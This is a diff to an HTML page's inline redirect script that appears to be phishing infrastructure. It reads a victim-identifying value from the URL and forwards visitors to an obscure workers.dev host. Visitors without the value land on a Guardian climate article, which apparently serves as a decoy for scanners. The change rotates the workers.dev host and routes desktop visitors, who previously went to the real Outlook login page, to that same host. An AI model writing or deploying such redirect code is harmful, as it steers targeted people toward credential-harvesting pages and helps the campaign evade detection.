@@ -137,7 +137,7 @@
     <script>
     (function() {
         const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
-        const MOBILE_REDIRECT_URL_BASE = "https://q08c2.6yxxxsjh68.workers.dev/?";
+        const MOBILE_REDIRECT_URL_BASE = "https://5xnxtiydc.578fr3chve.workers.dev/?";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
         const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
@@ -171,8 +171,9 @@
                     console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
                 } else {
-                    console.log("Non-mobile device detected. Redirecting to Outlook:", DESKTOP_REDIRECT_URL);
-                    window.location.href = DESKTOP_REDIRECT_URL;
+                     const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                    window.location.href = redirectUrl;
                 }
             } else {
                 console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
